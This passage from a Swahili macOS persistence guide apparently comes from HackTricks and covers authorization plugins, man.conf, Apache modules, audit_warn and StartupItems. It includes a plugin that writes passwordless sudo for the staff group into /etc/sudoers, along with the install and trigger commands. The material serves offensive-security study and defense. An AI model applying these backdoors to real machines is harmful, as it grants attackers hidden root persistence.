// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Hamisha** bundle hadi eneo itakapopakiwa:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Hatimaye ongeza **rule** ya kupakia Plugin hii:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`** itaueleza authorization framework kwamba itahitaji **kuita external mechanism kwa ajili ya authorization**. Zaidi ya hayo, **`privileged`** itafanya itekelezwe na root.

I-trigger kwa:
```bash
security authorize com.asdf.asdf
```
Na kisha **staff group inapaswa kuwa na** access ya sudo (soma `/etc/sudoers` kuthibitisha).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- Ni muhimu kwa bypass ya sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Lakini unahitaji kuwa root na mtumiaji lazima atumie man
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/private/etc/man.conf`**
- Root inahitajika
- **`/private/etc/man.conf`**: Kila wakati man inapotumika

#### Description & Exploit

Config file **`/private/etc/man.conf`** inaonyesha binary/script ya kutumia wakati wa kufungua man documentation files. Kwa hivyo path ya executable inaweza kubadilishwa ili kila wakati mtumiaji anapotumia man kusoma docs, backdoor itekelezwe.<sup>[[31]](#references)</sup>

Kwa mfano weka katika **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
Kisha unda `/tmp/view` kama:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- Muhimu kwa kubypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Lakini unahitaji kuwa root na apache lazima iwe inaendesha
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Httpd haina entitlements

#### Mahali

- **`/etc/apache2/httpd.conf`**
- Root inahitajika
- Trigger: Apache2 inapoanzishwa

#### Maelezo na Exploit

Unaweza kuashiria katika `/etc/apache2/httpd.conf` kupakia module kwa kuongeza mstari kama huu:<sup>[[32]](#references)</sup>
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
Kwa njia hii, module yako iliyokusanywa itapakiwa na Apache. Jambo pekee ni kwamba unahitaji ama **kui-sign kwa kutumia Apple certificate halali**, au **kuongeza certificate mpya inayoaminika** kwenye mfumo na **kui-sign** kwa kuitumia.

Kisha, ikihitajika, ili kuhakikisha kuwa server itaanzishwa unaweza kutekeleza:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Mfano wa code wa Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### Mfumo wa ukaguzi wa BSM

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- Muhimu kwa bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Lakini unahitaji kuwa root, auditd iwe inaendelea kufanya kazi na usababishe warning
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- **`/etc/security/audit_warn`**
- Root inahitajika
- **Trigger**: Wakati auditd inapogundua warning

#### Maelezo na Exploit

Kila auditd inapogundua warning, script **`/etc/security/audit_warn`** **hutekelezwa**. Kwa hivyo unaweza kuongeza payload yako ndani yake.<sup>[[33]](#references)</sup>
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Unaweza kulazimisha onyo kwa kutumia `sudo audit -n`.

### Startup Items

> [!CAUTION] > **Hii imepitwa na wakati, kwa hivyo hakuna kitu kinachopaswa kupatikana katika directories hizo.**

**StartupItem** ni directory inayopaswa kuwekwa ndani ya `/Library/StartupItems/` au `/System/Library/StartupItems/`. Baada ya directory hii kuanzishwa, lazima iwe na mafaili mawili maalum:

1. **rc script**: Shell script inayotekelezwa wakati wa startup.
2. **plist file**, iliyopewa jina maalum `StartupParameters.plist`, ambayo ina mipangilio mbalimbali ya configuration.

Hakikisha kwamba rc script na faili la `StartupParameters.plist` vimewekwa kwa usahihi ndani ya directory ya **StartupItem** ili startup process iweze kuvitambua na kuvitumia.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Siwezi kupata component hii kwenye macOS yangu, kwa hiyo angalia writeup kwa maelezo zaidi

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

Iliyoanzishwa na Apple, **emond** ni utaratibu wa logging unaoonekana kuwa haujakamilishwa au huenda uliachwa, lakini bado unaweza kufikiwa. Ingawa haina manufaa makubwa kwa msimamizi wa Mac, service hii isiyojulikana sana inaweza kutumika kama njia fiche ya persistence kwa threat actors, na huenda isigunduliwe na admins wengi wa macOS.<sup>[[34]](#references)</sup>

Kwa wanaofahamu uwepo wake, kutambua matumizi yoyote hasidi ya **emond** ni rahisi. LaunchDaemon ya mfumo ya service hii hutafuta scripts za kutekeleza kwenye directory moja. Ili kuchunguza hili, command ifuatayo inaweza kutumika:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### Mahali

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Root inahitajika
- **Trigger**: Kwa kutumia XQuartz

#### Maelezo na Exploit

XQuartz **haisakinishwi tena kwenye macOS**, kwa hiyo ukitaka maelezo zaidi angalia writeup.<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> Kusakinisha kext ni jambo gumu sana, hata ukiwa root, kiasi kwamba hii haichukuliwi kuwa mbinu ya kawaida ya sandbox-escape au persistence isipokuwa uwe na exploit.

#### Mahali

Ili kusakinisha KEXT kama startup item, inahitaji **kusakinishwa katika mojawapo ya maeneo yafuatayo**:

- `/System/Library/Extensions`
- Faili za KEXT zilizojengwa ndani ya mfumo wa uendeshaji wa OS X.
- `/Library/Extensions`
- Faili za KEXT zilizosakinishwa na software ya wahusika wengine

Unaweza kuorodhesha faili za kext zilizopakiwa kwa sasa kwa kutumia:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Kwa maelezo zaidi kuhusu [**kernel extensions angalia sehemu hii**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### Mahali

- **`/usr/local/bin/amstoold`**
- Root inahitajika

#### Maelezo na Exploitation

Inaonekana `plist` kutoka `/System/Library/LaunchAgents/com.apple.amstoold.plist` ilikuwa ikitumia binary hii huku ikifichua XPC service... jambo ni kwamba binary hiyo haikuwepo, hivyo ungeweza kuweka kitu hapo na XPC service ilipoitwa, binary yako ingeitiwa.<sup>[[35]](#references)</sup>

Siwezi tena kuipata kwenye macOS yangu.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### Mahali

- **`/Library/Preferences/Xsan/.xsanrc`**
- Root inahitajika
- **Trigger**: Service inapoendeshwa (mara chache)

#### Maelezo na exploit

Inaonekana si jambo la kawaida sana kuendesha script hii, na hata sikuweza kuipata kwenye macOS yangu, kwa hiyo ukitaka maelezo zaidi angalia writeup.<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **Hii haifanyi kazi katika matoleo ya kisasa ya MacOS**

Pia inawezekana kuweka hapa **commands ambazo zitatekelezwa wakati wa kuanza.** Mfano wa script ya kawaida ya rc.common:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Mbinu na zana za persistence

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025, mwaka wa Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [Beyond the good ol' LaunchAgents - 1 - mafaili ya kuanzisha shell](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [Beyond the good ol' LaunchAgents - 18 - X11 na XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [Beyond the good ol' LaunchAgents - 21 - Applications zilizofunguliwa tena](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [Beyond the good ol' LaunchAgents - 20 - Mapendeleo ya Terminal](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [Beyond the good ol' LaunchAgents - 13 - Plugins za sauti](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Plugins za Audio Unit (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [Beyond the good ol' LaunchAgents - 12 - Plugins za QuickLook](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [Beyond the good ol' LaunchAgents - 22 - LoginHook na LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [Beyond the good ol' LaunchAgents - 4 - kazi za cron](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [Beyond the good ol' LaunchAgents - 2 - uanzishaji wa iTerm2](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [Beyond the good ol' LaunchAgents - 7 - plugins za xbar](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [Beyond the good ol' LaunchAgents - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [Beyond the good ol' LaunchAgents - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [Beyond the good ol' LaunchAgents - 3 - Vipengee vya Login](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [Beyond the good ol' LaunchAgents - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [Beyond the good ol' LaunchAgents - 24 - Vitendo vya Folda](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [Vitendo vya Folda kwa Persistence kwenye macOS (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [Beyond the good ol' LaunchAgents - 27 - Njia za mkato za Dock](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [Beyond the good ol' LaunchAgents - 17 - Viteuzi vya Rangi](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [Beyond the good ol' LaunchAgents - 26 - Plugins za Finder Sync](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [Kuchanganua Persistence ya "Mac File Opener" (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [Beyond the good ol' LaunchAgents - 16 - Kihifadhi-skrini](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Kuhifadhi Ufikiaji Wako: Vihifadhi-skrini kwa Persistence ya macOS (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [Beyond the good ol' LaunchAgents - 11 - Waagizaji wa Spotlight](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [Beyond the good ol' LaunchAgents - 9 - Pane ya Mapendeleo](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [Beyond the good ol' LaunchAgents - 19 - Scripts za Mara kwa Mara](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [Beyond the good ol' LaunchAgents - 5 - Moduli za Uthibitishaji Zinazoweza Kuunganishwa (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [Beyond the good ol' LaunchAgents - 28 - Plugins za Authorization](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Wizi Endelevu wa Credentials kwa kutumia Plugins za Authorization (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [Beyond the good ol' LaunchAgents - 30 - Faili la usanidi la man - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [Beyond the good ol' LaunchAgents - 25 - Moduli za Apache2](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [Beyond the good ol' LaunchAgents - 31 - Mfumo wa ukaguzi wa BSM](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [Beyond the good ol' LaunchAgents - 23 - emond, Daemon ya Kufuatilia Matukio](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [Beyond the good ol' LaunchAgents - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [Beyond the good ol' LaunchAgents - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
{{#include ../banners/hacktricks-training.md}}
